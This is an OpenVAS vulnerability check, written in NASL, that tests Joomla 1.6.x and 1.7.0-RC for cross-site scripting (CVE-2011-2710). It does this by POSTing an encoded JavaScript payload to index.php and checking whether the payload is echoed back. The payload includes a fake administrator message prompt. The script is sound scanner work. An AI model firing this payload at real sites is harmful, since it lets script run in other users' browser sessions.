##############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_joomla_mult_xss_vuln_jul11.nasl 9351 2018-04-06 07:05:43Z cfischer $
#
# Joomla! CMS Multiple Cross Site Scripting Vulnerabilities - July 2011
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2011 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploitation will allow attacker to insert arbitrary HTML and
  script code, which will be executed in a user's browser session in the
  context of an affected site.
  Impact Level: Application.";
tag_affected = "Joomla CMS versions 1.6.x and 1.7.0-RC.";
tag_insight = "Multiple flaws are caused by improper validation of user-supplied input via
  multiple parameters to 'index.php', which allows attackers to execute
  arbitrary HTML and script code on the web server.";
tag_solution = "Upgrade to Joomla CMS 1.7.0 or later.
  For updates refer to http://www.joomla.org/";
tag_summary = "This host is running Joomla and is prone to multiple cross site
  scripting vulnerabilities.";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902541");
  script_version("$Revision: 9351 $");
  script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:05:43 +0200 (Fri, 06 Apr 2018) $");
  script_tag(name:"creation_date", value:"2011-07-27 14:47:11 +0200 (Wed, 27 Jul 2011)");
  script_cve_id("CVE-2011-2710");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_name("Joomla! CMS Multiple Cross Site Scripting Vulnerabilities - July 2011");
  script_xref(name : "URL" , value : "http://seclists.org/fulldisclosure/2011/Jul/271");
  script_xref(name : "URL" , value : "http://www.openwall.com/lists/oss-security/2011/07/22/5");
  script_xref(name : "URL" , value : "http://bl0g.yehg.net/2011/07/joomla-170-rc-and-lower-multiple-cross.html");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 SecPod");
  script_family("Web application abuses");
  script_dependencies("joomla_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("joomla/installed");
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("version_func.inc");

port = get_http_port(default:80);
if(!dir = get_dir_from_kb(port:port,app:"joomla")) {
  exit(0);
}

host = http_host_name( port:port );

## Construct the Attack Request
attack = string("task=search&Itemid=435&searchword=Search';onunload=function()",
                "{x=confirm(String.fromCharCode(89,111,117,39,118,101,32,103,",
                "111,116,32,97,32,109,101,115,115,97,103,101,32,102,114,111,",
                "109,32,65,100,109,105,110,105,115,116,114,97,116,111,114,33,",
                "10,68,111,32,121,111,117,32,119,97,110,116,32,116,111,32,103,",
                "111,32,116,111,32,73,110,98,111,120,63));alert(String.from",
                "CharCode(79,112,101,110,86,65,83,45,88,83,83,45,84,101,115,",
                "116));};//xsssssssssss&option=com_search");

req = string("POST ", dir, "/index.php HTTP/1.1\r\n",
             "Host: ", host, "\r\n",
             "User-Agent: ", OPENVAS_HTTP_USER_AGENT, "\r\n",
             "Content-Type: application/x-www-form-urlencoded\r\n",
             "Content-Length: ", strlen(attack), "\r\n\r\n", attack);

## Try XSS Attack
res = http_keepalive_send_recv(port:port, data:req);

## Confirm exploit worked by checking the response
if(ereg(pattern:"^HTTP/[0-9]\.[0-9] 200 .*", string:res) &&
  (';alert(String.fromCharCode(79,112,101,110,86,65,83,45,88,83,83,45,' +
   '84,101,115,116));' >< res)){
  security_message(port);
}
